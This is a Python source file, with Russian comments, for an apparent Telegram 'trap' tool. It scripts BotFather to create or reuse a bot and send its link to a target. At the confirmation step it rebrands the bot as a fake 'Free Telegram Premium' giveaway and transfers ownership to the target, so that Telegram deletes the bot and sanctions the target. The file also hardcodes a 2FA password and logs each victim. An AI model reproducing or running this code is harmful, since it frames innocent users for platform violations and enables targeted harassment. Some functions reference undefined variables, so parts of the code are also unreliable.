"""
Brown V2 | trap_snos.py
Метод: бот-ловушка
1. Проверяет существующих ботов через /mybots, если нет - создаёт новый
2. Пользователь скидывает жертве ссылку, ждёт /start
3. Передаёт владельца бота жертве через BotFather
4. ТОЛЬКО после "You are about to transfer..." меняет данные бота
5. Нажимает Yes/proceed - после этого TG удаляет бота + санкции на жертву
"""

import asyncio
import os
import random
import string
import re
import aiohttp

from telethon import TelegramClient

import config
from utils import now_msk, esc_md

SESSION_PATH  = "trap_session/trap"
CLOUD_PASS    = "Ali095095"
AVATAR_PATH   = "material/ava.png"
BOTFATHER     = "BotFather"

API_ID   = int(config.AUREPORT_API_ID)
API_HASH = config.AUREPORT_API_HASH

TRAP_NAME        = "Premium"
TRAP_DESCRIPTION = (
    "Get FREE Telegram Premium subscription!\n"
    "This bot gives you Telegram Premium for free.\n"
    "Claim your reward now - limited time offer!"
)
TRAP_ABOUT = "Free Telegram Premium - claim your gift inside!"

bot = None


def set_bot_trap(b):
    global bot
    bot = b


def _rand_bot_name() -> str:
    first  = ["Quick","Smart","Super","Ultra","Turbo","Fast","Easy","Cool","Best","Top"]
    second = ["Notify","Alert","Helper","Service","Info","News","Update","Check","Track","Guide"]
    return random.choice(first) + random.choice(second)


def _rand_bot_username() -> str:
    prefix = "".join(random.choices(string.ascii_lowercase, k=random.randint(4, 7)))
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(3, 5)))
    return f"{prefix}{suffix}bot"


async def _get_client() -> TelegramClient:
    client = TelegramClient(
        SESSION_PATH, API_ID, API_HASH,
        system_version="4.16.30-vxCUSTOM"
    )
    await client.connect()
    # Если есть сохранённая сессия - она подхватится автоматически
    # 2FA пароль не нужен при connect() если сессия уже авторизована
    return client


async def _wait_bf_message(client, bf, keywords: list, timeout: int = 30) -> str | None:
    """Ждёт сообщения от BotFather содержащего любое из ключевых слов."""
    for _ in range(timeout // 2):
        msgs = await client.get_messages(bf, limit=5)
        for msg in msgs:
            if msg.text:
                text_lower = msg.text.lower()
                if any(kw.lower() in text_lower for kw in keywords):
                    return msg.text
        await asyncio.sleep(2)
    return None


async def _click_button(client, bf, keywords: list, timeout: int = 30) -> bool:
    """Ищет и нажимает кнопку содержащую любое из ключевых слов."""
    for _ in range(timeout // 2):
        msgs = await client.get_messages(bf, limit=10)
        for msg in msgs:
            if msg.buttons:
                for row in msg.buttons:
                    for btn in row:
                        if any(kw.lower() in btn.text.lower() for kw in keywords):
                            await btn.click()
                            print(f"[TRAP] Нажата кнопка: {btn.text}", flush=True)
                            await asyncio.sleep(2)
                            return True
        await asyncio.sleep(2)
    # Выводим все кнопки что нашли для отладки
    msgs = await client.get_messages(bf, limit=10)
    for msg in msgs:
        if msg.buttons:
            for row in msg.buttons:
                for btn in row:
                    print(f"[TRAP] Доступная кнопка: '{btn.text}'", flush=True)
    print(f"[TRAP] Кнопка не найдена: {keywords}", flush=True)
    return False


async def _apply_trap_data(token: str):
    """Меняет данные бота через Bot API на TOS-нарушение."""
    base = f"https://api.telegram.org/bot{token}"
    async with aiohttp.ClientSession() as session:
        await session.post(f"{base}/setMyName",
            json={"name": TRAP_NAME})
        await session.post(f"{base}/setMyDescription",
            json={"description": TRAP_DESCRIPTION})
        await session.post(f"{base}/setMyShortDescription",
            json={"short_description": TRAP_ABOUT})
    print(f"[TRAP] Данные бота изменены на TOS-нарушение", flush=True)


# ─── Шаг 1: Получаем готового бота (существующий или новый) ──────────────────
async def main_trap_snos(user_id: int, username: str, notify_bot=None) -> dict:
    _notify = notify_bot or bot
    """
    Проверяет существующих ботов через /mybots.
    Если есть - берёт первого. Если нет - создаёт нового.
    Возвращает {ok, bot_token, bot_username}
    """
    from config import bot_logs
    import keyboards

    await _notify.send_message(user_id,
        "🪤 *Trap-метод*\n*└─ Проверяю существующих ботов...*",
        parse_mode="Markdown")

    client = await _get_client()
    try:
        if not await client.is_user_authorized():
            await client.disconnect()
            await _notify.send_message(user_id,
                "❌ *Trap-сессия не авторизована!*\nПоложи сессию в trap_session/",
                parse_mode="Markdown")
            return {"ok": False, "error": "session_invalid"}

        print(f"[TRAP] Сессия авторизована, получаю BotFather...", flush=True)
        bf = await client.get_entity(BOTFATHER)
        print(f"[TRAP] BotFather получен, отправляю /mybots...", flush=True)

        # ── Проверяем существующих ботов ──────────────────────────────────────
        await client.send_message(bf, "/mybots")
        await asyncio.sleep(3)

        msgs = await client.get_messages(bf, limit=5)
        existing_bot = None
        print(f"[TRAP] Получено {len(msgs)} сообщений от BotFather", flush=True)
        for msg in msgs:
            print(f"[TRAP] msg text: {str(msg.text)[:80]} | buttons: {bool(msg.buttons)}", flush=True)
            if msg.buttons:
                for row in msg.buttons:
                    for btn in row:
                        # Кнопки с ботами выглядят как "@username"
                        if btn.text.startswith("@") and "bot" in btn.text.lower():
                            existing_bot = btn.text.lstrip("@")
                            print(f"[TRAP] Найден существующий бот: *@{existing_bot}*", flush=True)
                            # Нажимаем на него чтобы получить токен
                            await btn.click()
                            await asyncio.sleep(3)
                            break
                    if existing_bot:
                        break
            if existing_bot:
                break

        bot_token = None
        bot_username_final = None

        if existing_bot:
            # Берём токен существующего бота через "API Token"
            token_clicked = await _click_button(client, bf, ["API Token", "token", "Token"], timeout=10)
            if token_clicked:
                await asyncio.sleep(2)
                token_msgs = await client.get_messages(bf, limit=5)
                for msg in token_msgs:
                    if msg.text:
                        match = re.search(r'\d{8,12}:[A-Za-z0-9_-]{35,}', msg.text)
                        if match:
                            bot_token = match.group(0)
                            bot_username_final = existing_bot
                            print(f"[TRAP] Токен существующего бота: {bot_token[:20]}...", flush=True)
                            break

            if not bot_token:
                # Не удалось взять токен, создаём нового
                existing_bot = None

        if not existing_bot or not bot_token:
            # ── Создаём нового бота ───────────────────────────────────────────
            bot_name = _rand_bot_name()
            bot_username_new = _rand_bot_username()

            print(f"[TRAP] Создаём нового бота: {bot_name} / *@{bot_username_new}*", flush=True)
            await _notify.send_message(user_id,
                "*└─ Существующих ботов нет, создаю нового...*",
                parse_mode="Markdown")

            await client.send_message(bf, "/newbot")
            await asyncio.sleep(2)

            # Ждём запроса имени
            await _wait_bf_message(client, bf, ["name for your bot", "call it", "Choose a name"], timeout=10)
            await client.send_message(bf, bot_name)
            await asyncio.sleep(2)

            # Ждём запроса username
            await _wait_bf_message(client, bf, ["username", "must end in", "tetris"], timeout=10)
            await client.send_message(bf, bot_username_new)
            await asyncio.sleep(4)

            # Читаем токен
            msgs = await client.get_messages(bf, limit=5)
            for msg in msgs:
                if msg.text:
                    match = re.search(r'\d{8,12}:[A-Za-z0-9_-]{35,}', msg.text)
                    if match:
                        bot_token = match.group(0)
                        bot_username_final = bot_username_new
                        break

            if not bot_token:
                await client.disconnect()
                await _notify.send_message(user_id,
                    "❌ *Не удалось создать бота!*\nВозможно username занят.",
                    parse_mode="Markdown")
                return {"ok": False, "error": "no_token"}

        await client.disconnect()

        print(f"[TRAP] Бот готов: *@{bot_username_final}* | {bot_token[:20]}...", flush=True)

        await _notify.send_message(user_id,
            f"🤖 *Бот готов!*\n"
            f"*└─ *@{bot_username_final}**\n\n"
            f"📤 *Скинь жертве:* t.me/{bot_username_final}\n"
            f"*Дождись пока жертва напишет /start*\n\n"
            f"*После этого нажми кнопку* 👇",
            parse_mode="Markdown",
            reply_markup=keyboards.trap_done_markup
        )

        return {
            "ok": True,
            "bot_token": bot_token,
            "bot_username": bot_username_final,
        }

    except Exception as e:
        print(f"[TRAP] Ошибка: {e}", flush=True)
        try:
            await client.disconnect()
        except Exception:
            pass
        await _notify.send_message(user_id,
            f"❌ *Ошибка trap:* {str(e)[:100]}",
            parse_mode="Markdown")
        return {"ok": False, "error": str(e)}


# ─── Шаг 2: Передача владельца + смена данных ────────────────────────────────
async def transfer_and_apply(bot_token: str, bot_username: str,
                              victim_username: str,
                              user_id: int, username: str) -> dict:
    """
    Передаёт владельца бота жертве через BotFather.
    Данные меняются ТОЛЬКО после получения сообщения
    "You are about to transfer ownership..."
    """
    from config import bot_logs
    import keyboards

    victim = victim_username.lstrip("@")
    print(f"[TRAP] Передача *@{bot_username}* → *@{victim}*", flush=True)

    await _notify.send_message(user_id,
        f"🔄 *Передаю *@{bot_username}* → *@{victim}*...*",
        parse_mode="Markdown")

    client = await _get_client()
    try:
        if not await client.is_user_authorized():
            await client.disconnect()
            return {"ok": False, "error": "session_invalid"}

        bf = await client.get_entity(BOTFATHER)

        # /mybots
        await client.send_message(bf, "/mybots")
        await asyncio.sleep(3)

        # Нажимаем на нашего бота
        found = await _click_button(client, bf, [bot_username, f"*@{bot_username}*"], timeout=15)
        if not found:
            # Пробуем нажать любую кнопку с ботом
            await _click_button(client, bf, ["@"], timeout=10)
        await asyncio.sleep(3)

        # Transfer ownership
        await _click_button(client, bf, ["Transfer ownership", "Transfer", "transfer"], timeout=15)
        await asyncio.sleep(4)

        # Choose recipient — ждём появления этой кнопки
        await _click_button(client, bf, ["Choose recipient", "Choose", "recipient"], timeout=20)
        await asyncio.sleep(3)

        # Ждём "Please share the new owner's contact or their username"
        msg_text = await _wait_bf_message(client, bf,
            ["share", "username", "owner", "contact"], timeout=20)
        if msg_text:
            print(f"[TRAP] BotFather готов принять username", flush=True)

        # Вводим username жертвы
        await client.send_message(bf, f"*@{victim}*")
        await asyncio.sleep(3)

        # Ждём "You are about to transfer ownership..."
        # ТОЛЬКО здесь меняем данные бота
        confirm_text = await _wait_bf_message(client, bf,
            ["about to transfer", "won't be able", "new owner"], timeout=30)

        if confirm_text:
            print(f"[TRAP] Получено подтверждение передачи — меняем данные бота!", flush=True)
            # ЗДЕСЬ меняем данные — ещё до нажатия Yes
            await _apply_trap_data(bot_token)
        else:
            print(f"[TRAP] Подтверждение не получено, всё равно продолжаем", flush=True)

        # Нажимаем Yes/proceed
        await _click_button(client, bf,
            ["Yes", "proceed", "I am", "Sure"], timeout=15)
        await asyncio.sleep(3)

        # Ждём запроса пароля и вводим его
        pass_requested = await _wait_bf_message(client, bf,
            ["password", "2-step", "cloud"], timeout=10)
        if pass_requested:
            await client.send_message(bf, CLOUD_PASS)
            await asyncio.sleep(5)

        # Проверяем успех
        transferred = False
        success_msg = await _wait_bf_message(client, bf,
            ["It worked", "new home", "enjoy"], timeout=15)
        if success_msg:
            transferred = True
            print(f"[TRAP] Передача успешна!", flush=True)

        await client.disconnect()

        ts = now_msk().strftime("%d.%m.%Y %H:%M:%S")

        caption = (
            f"🪤 *Trap-метод завершён!*\n\n"
            f"{'✅' if transferred else '⚠️'} *Бот передан:* *@{bot_username}*\n"
            f"🎯 *Жертва:* *@{victim}*\n"
            f"⏰ *Время:* {ts}"
        )
        caption_log = (
            f"🪤 *Trap*\n"
            f"{'✅' if transferred else '⚠️'} *@{bot_username}* → *@{victim}*\n"
            f"👤 {user_id} (*@{username}*)\n"
            f"⏰ {ts}"
        )

        await _notify.send_message(user_id, caption,
            parse_mode="Markdown", reply_markup=keyboards.main_menu)
        await (main_bot or bot).send_message(bot_logs, caption_log,
            parse_mode="Markdown")

        return {"ok": True, "transferred": transferred}

    except Exception as e:
        print(f"[TRAP] Ошибка передачи: {e}", flush=True)
        try:
            await client.disconnect()
        except Exception:
            pass
        await _notify.send_message(user_id,
            f"❌ *Ошибка передачи:* {str(e)[:100]}",
            parse_mode="Markdown", reply_markup=keyboards.main_menu)
        return {"ok": False, "error": str(e)}
